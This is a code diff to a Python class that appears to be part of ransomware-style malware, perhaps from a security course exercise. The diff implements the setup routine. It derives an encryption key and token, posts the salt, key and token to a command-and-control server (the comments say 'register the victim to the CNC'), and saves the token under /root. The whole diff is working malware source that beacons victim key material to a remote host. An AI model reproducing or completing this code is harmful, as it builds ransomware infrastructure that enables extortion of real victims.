@@ -2,6 +2,7 @@ from hashlib import sha256
 import logging
 import secrets
 from os import path, urandom
+from pathlib import Path
 from typing import List, Tuple
 import requests
 import base64
@@ -9,8 +10,10 @@ import base64
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
+
 from xorcrypt import xorfile
 
+TOKEN_PATH = "/root/token"
 
 class SecretManager:
     KDF_ITERATION_NUMBER = 48000
@@ -34,33 +37,46 @@ class SecretManager:
                          iterations = SecretManager.KDF_ITERATION_NUMBER)
         self._key = KDF.derive(key)
         self._token = secrets.token_bytes(SecretManager.TOKEN_LENGTH) 
+        return None
    
     def create(self) -> Tuple[bytes, bytes, bytes]:
         self.do_derivation(urandom(SecretManager.SALT_LENGTH), urandom(SecretManager.KEY_LENGTH))
-        self._log.info((self._token, self._key, self._salt))
+        self._log.debug((self._token, self._key, self._salt))
         return (self._salt, self._key, self._token)
 
     def bin_to_b64(self, data: bytes) -> str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
-    # def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
-    def post_new(self) -> None:
+    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
         # register the victim to the CNC
         secrets_json = {
-                "salt": self.bin_to_b64(self._salt),
-                "key": self.bin_to_b64(self._key),
-                "token": self.bin_to_b64(self._token),
+                "salt": self.bin_to_b64(salt),
+                "key": self.bin_to_b64(key),
+                "token": self.bin_to_b64(token),
                 }
         header = {"Content-Type":"application/json"}
         self._log.debug(secrets_json)
         # self._log.debug(headers)
-        url = 'http://' + self._remote_host_port + '/new?token=' + str(int.from_bytes(self._token))
+        url = 'http://' + self._remote_host_port + '/new?token=' + str(int.from_bytes(token))
         requests.post(url, json = secrets_json, headers=header)
+        return None
 
     def setup(self) -> None:
         # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+        self.create()
+        self.post_new(self._salt, self._key, self._token)
+        if not Path(TOKEN_PATH).exists():  
+            Path(TOKEN_PATH).mkdir(parents=True, exist_ok=True)
+        if Path(TOKEN_PATH + '/token.bin').exists():
+            raise FileExistsError
+        """
+        open taking parameter 'wb' allows the program to write into a binary file
+        """
+        with open(TOKEN_PATH + '/token.bin', 'wb') as token_binary_file:
+            token_binary_file.write(self._token)
+
+        return None
 
     def load(self) -> None:
         # function to load crypto data
